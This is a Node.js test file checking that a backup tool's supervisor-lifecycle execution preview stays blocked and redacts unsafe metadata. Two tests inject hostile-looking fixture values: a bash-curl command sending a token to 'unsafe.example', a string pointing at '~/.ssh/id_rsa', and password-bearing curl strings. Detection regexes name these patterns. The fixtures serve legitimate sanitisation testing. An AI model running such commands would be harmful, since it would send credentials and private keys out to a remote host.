import { describe, it } from 'node:test';
import assert from 'node:assert';
import {
  buildSupervisorLifecycleApplyPlan,
  buildSupervisorLifecycleGuardedRunnerExecutionPreview,
  buildSupervisorLifecycleGuardedRunnerReadiness,
  validateSupervisorLifecycleExecutorManifest,
} from '../src/supervisor-lifecycle.js';

const NOW = new Date('2026-07-08T12:00:00.000Z');
const BASE_CONFIG = Object.freeze({
  serverUrl: 'http://localhost:3000',
  deviceId: 'macbook-alpha',
  backupJobs: [{ name: 'Documents', sourcePath: '/Users/ah/Documents' }],
});

function clone(value) {
  return JSON.parse(JSON.stringify(value));
}

function getInstallPlan() {
  return buildSupervisorLifecycleApplyPlan(BASE_CONFIG, { operation: 'install', now: NOW });
}

function getValidManifest() {
  return {
    kind: 'supervisor-lifecycle-executor-manifest',
    schemaVersion: 1,
    actions: [
      {
        actionId: 'render-launch-agent-plist',
        implementationId: 'render-plist-impl',
        mode: 'guarded-host-action',
        requiresApprovalRecord: true,
        maxAttempts: 2,
      },
      {
        actionId: 'write-launch-agent-plist',
        implementationId: 'write-plist-impl',
        mode: 'guarded-host-action',
        requiresApprovalRecord: true,
        maxAttempts: 1,
      },
      {
        actionId: 'load-launch-agent',
        implementationId: 'load-agent-impl',
        mode: 'guarded-host-action',
        requiresApprovalRecord: true,
        maxAttempts: 3,
      },
    ],
  };
}

function getValidRunnerBinding() {
  return {
    kind: 'supervisor-lifecycle-guarded-runner-binding',
    schemaVersion: 1,
    bindings: [
      {
        actionId: 'render-launch-agent-plist',
        implementationId: 'render-plist-impl',
        mode: 'guarded-host-action',
        runnerKind: 'guarded-runner-stub',
        requiresApprovalRecord: true,
        maxAttempts: 2,
      },
      {
        actionId: 'write-launch-agent-plist',
        implementationId: 'write-plist-impl',
        mode: 'guarded-host-action',
        runnerKind: 'guarded-runner-stub',
        requiresApprovalRecord: true,
        maxAttempts: 1,
      },
      {
        actionId: 'load-launch-agent',
        implementationId: 'load-agent-impl',
        mode: 'guarded-host-action',
        runnerKind: 'guarded-runner-stub',
        requiresApprovalRecord: true,
        maxAttempts: 3,
      },
    ],
  };
}

function getValidGuardedRunnerReadiness(plan = getInstallPlan()) {
  const manifestReadiness = validateSupervisorLifecycleExecutorManifest(plan, getValidManifest());
  return buildSupervisorLifecycleGuardedRunnerReadiness(manifestReadiness, getValidRunnerBinding());
}

function assertAlwaysBlockedPreview(result) {
  assert.strictEqual(result.command, 'supervisor-lifecycle-guarded-runner-execution-preview');
  assert.strictEqual(result.state, 'blocked');
  assert.strictEqual(result.executionReady, false);
  assert.strictEqual(result.executorReady, false);
  assert.strictEqual(result.wouldExecute, false);
  assert.ok(result.blockers.includes('guarded-runner-execution-preview-only'));
  assert.ok(result.nextBlockers.includes('real-guarded-runner-execution-wiring-missing'));
  assert.strictEqual(result.safety.readOnly, true);
  assert.strictEqual(result.safety.dryRun, true);
  assert.strictEqual(result.safety.hostMutation, false);
  assert.strictEqual(result.safety.launchctlCalled, false);
  assert.strictEqual(result.safety.processListRead, false);
  assert.strictEqual(result.safety.filesystemWritten, false);
  assert.strictEqual(result.safety.lifecycleApplied, false);
  assert.strictEqual(result.safety.nasConnected, false);
  assert.strictEqual(result.safety.backupTriggered, false);
  assert.strictEqual(result.safety.restoreTriggered, false);
  assert.strictEqual(result.safety.remoteCommandExecuted, false);
}

describe('buildSupervisorLifecycleGuardedRunnerExecutionPreview', () => {
  it('returns blocked action previews for valid plan and ready guarded runner metadata', () => {
    const plan = getInstallPlan();
    const readiness = getValidGuardedRunnerReadiness(plan);

    const result = buildSupervisorLifecycleGuardedRunnerExecutionPreview(plan, readiness);

    assertAlwaysBlockedPreview(result);
    assert.strictEqual(result.operation, 'install');
    assert.strictEqual(result.runnerBindingsReady, true);
    assert.deepStrictEqual(result.blockers, ['guarded-runner-execution-preview-only']);
    assert.deepStrictEqual(result.nextBlockers, ['real-guarded-runner-execution-wiring-missing']);
    assert.deepStrictEqual(result.gates, {
      lifecyclePlanValid: true,
      runnerBindingsReady: true,
      executionPreviewOnly: true,
      executorReady: false,
    });
    assert.deepStrictEqual(result.actionPreviews, [
      {
        actionId: 'render-launch-agent-plist',
        implementationId: 'render-plist-impl',
        runnerKind: 'guarded-runner-stub',
        mode: 'guarded-host-action',
        status: 'blocked',
        wouldExecute: false,
        wouldRun: false,
        wouldWrite: false,
        maxAttempts: 2,
      },
      {
        actionId: 'write-launch-agent-plist',
        implementationId: 'write-plist-impl',
        runnerKind: 'guarded-runner-stub',
        mode: 'guarded-host-action',
        status: 'blocked',
        wouldExecute: false,
        wouldRun: false,
        wouldWrite: false,
        maxAttempts: 1,
      },
      {
        actionId: 'load-launch-agent',
        implementationId: 'load-agent-impl',
        runnerKind: 'guarded-runner-stub',
        mode: 'guarded-host-action',
        status: 'blocked',
        wouldExecute: false,
        wouldRun: false,
        wouldWrite: false,
        maxAttempts: 3,
      },
    ]);
  });

  it('blocks guarded runner readiness from a different lifecycle operation', () => {
    const installPlan = getInstallPlan();
    const installReadiness = getValidGuardedRunnerReadiness(installPlan);
    const rollbackPlan = buildSupervisorLifecycleApplyPlan(BASE_CONFIG, { operation: 'rollback', now: NOW });

    const result = buildSupervisorLifecycleGuardedRunnerExecutionPreview(rollbackPlan, installReadiness);
    const serialized = JSON.stringify(result);

    assertAlwaysBlockedPreview(result);
    assert.strictEqual(result.operation, 'rollback');
    assert.strictEqual(result.runnerBindingsReady, false);
    assert.ok(result.blockers.includes('guarded-runner-operation-mismatch'));
    assert.strictEqual(result.gates.lifecyclePlanValid, true);
    assert.strictEqual(result.gates.runnerBindingsReady, false);
    assert.doesNotMatch(serialized, /localhost|Documents|\/Users\/ah|macbook-alpha/i);
  });

  it('does not throw for null or wrong-type inputs and returns stable invalid blockers', () => {
    const plan = getInstallPlan();
    const readiness = getValidGuardedRunnerReadiness(plan);

    for (const invalidPlan of [null, undefined, [], 'plan', 42]) {
      let result;
      assert.doesNotThrow(() => {
        result = buildSupervisorLifecycleGuardedRunnerExecutionPreview(invalidPlan, readiness);
      });
      assertAlwaysBlockedPreview(result);
      assert.ok(result.blockers.includes('invalid-lifecycle-plan'));
      assert.strictEqual(result.gates.lifecyclePlanValid, false);
    }

    for (const invalidReadiness of [null, undefined, [], 'readiness', 42]) {
      let result;
      assert.doesNotThrow(() => {
        result = buildSupervisorLifecycleGuardedRunnerExecutionPreview(plan, invalidReadiness);
      });
      assertAlwaysBlockedPreview(result);
      assert.ok(result.blockers.includes('invalid-guarded-runner-readiness'));
      assert.strictEqual(result.gates.runnerBindingsReady, false);
    }
  });

  it('blocks malformed lifecycle plan objects without throwing', () => {
    const readiness = getValidGuardedRunnerReadiness();
    const result = buildSupervisorLifecycleGuardedRunnerExecutionPreview(
      { command: 'supervisor-lifecycle-apply', operation: 'install', actions: 'bad', blockers: [] },
      readiness,
    );

    assertAlwaysBlockedPreview(result);
    assert.ok(result.blockers.includes('invalid-lifecycle-plan'));
    assert.strictEqual(result.gates.lifecyclePlanValid, false);
    assert.deepStrictEqual(result.actionPreviews, []);
  });

  it('adds guarded-runner-readiness-not-ready when guarded runner readiness is blocked', () => {
    const plan = getInstallPlan();
    const runnerBinding = getValidRunnerBinding();
    runnerBinding.bindings = runnerBinding.bindings.filter((entry) => entry.actionId !== 'load-launch-agent');
    const manifestReadiness = validateSupervisorLifecycleExecutorManifest(plan, getValidManifest());
    const notReadyReadiness = buildSupervisorLifecycleGuardedRunnerReadiness(manifestReadiness, runnerBinding);

    const result = buildSupervisorLifecycleGuardedRunnerExecutionPreview(plan, notReadyReadiness);

    assertAlwaysBlockedPreview(result);
    assert.strictEqual(result.runnerBindingsReady, false);
    assert.ok(result.blockers.includes('guarded-runner-readiness-not-ready'));
    assert.ok(result.blockers.includes('guarded-runner-execution-preview-only'));
  });

  it('detects tampered lifecycle action sequences and redacts unsafe action metadata', () => {
    const plan = {
      ...getInstallPlan(),
      actions: [
        { id: '/bin/bash -c "curl http://unsafe.example/token=secret-token"' },
      ],
    };
    const readiness = {
      ...getValidGuardedRunnerReadiness(),
      runnerBindings: [
        {
          actionId: '/bin/bash -c "curl http://unsafe.example/token=secret-token"',
          implementationId: 'render-plist-impl',
          runnerKind: 'guarded-runner-stub',
          mode: 'guarded-host-action',
          maxAttempts: 2,
        },
      ],
    };

    const result = buildSupervisorLifecycleGuardedRunnerExecutionPreview(plan, readiness);
    const serialized = JSON.stringify(result);

    assertAlwaysBlockedPreview(result);
    assert.ok(result.blockers.includes('lifecycle-plan-action-mismatch'));
    assert.ok(serialized.includes('[redacted]'));
    assert.doesNotMatch(serialized, /\/bin\/bash|curl|unsafe\.example|token|secret-token/i);
  });

  it('redacts unsafe runner metadata from action previews', () => {
    const plan = getInstallPlan();
    const readiness = clone(getValidGuardedRunnerReadiness(plan));
    readiness.runnerBindings[0].implementationId =
      'sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef';
    readiness.runnerBindings[0].runnerKind = 'node /Users/ah/.ssh/id_rsa token=SECRET_XYZ';
    readiness.runnerBindings[0].mode = 'curl http://unsafe.example password=super-secret';

    const result = buildSupervisorLifecycleGuardedRunnerExecutionPreview(plan, readiness);
    const firstPreview = result.actionPreviews[0];
    const serialized = JSON.stringify(result);

    assertAlwaysBlockedPreview(result);
    assert.strictEqual(firstPreview.actionId, 'render-launch-agent-plist');
    assert.strictEqual(firstPreview.implementationId, '[redacted]');
    assert.strictEqual(firstPreview.runnerKind, '[redacted]');
    assert.strictEqual(firstPreview.mode, '[redacted]');
    assert.doesNotMatch(serialized, /sha256:|0123456789abcdef|\/Users\/ah|\.ssh|SECRET_XYZ|unsafe\.example|password=|super-secret/i);
  });

  it('does not overclaim real execution readiness or simulated execution', () => {
    const result = buildSupervisorLifecycleGuardedRunnerExecutionPreview(
      getInstallPlan(),
      getValidGuardedRunnerReadiness(),
    );

    assertAlwaysBlockedPreview(result);
    assert.strictEqual(result.gates.executionPreviewOnly, true);
    assert.strictEqual(result.gates.executorReady, false);
    assert.strictEqual(result.safety.metadataWritten, false);
    assert.strictEqual(result.safety.rollbackAnchorWritten, false);
    assert.strictEqual(result.safety.auditEventWritten, false);
    assert.strictEqual(result.safety.approvalPersisted, false);
    assert.strictEqual(result.safety.sensitiveValuesReturned, false);
    assert.strictEqual(Object.hasOwn(result, 'events'), false);
    assert.ok(result.actionPreviews.every((entry) =>
      entry.status === 'blocked' &&
        entry.wouldExecute === false &&
        entry.wouldRun === false &&
        entry.wouldWrite === false));
  });
});
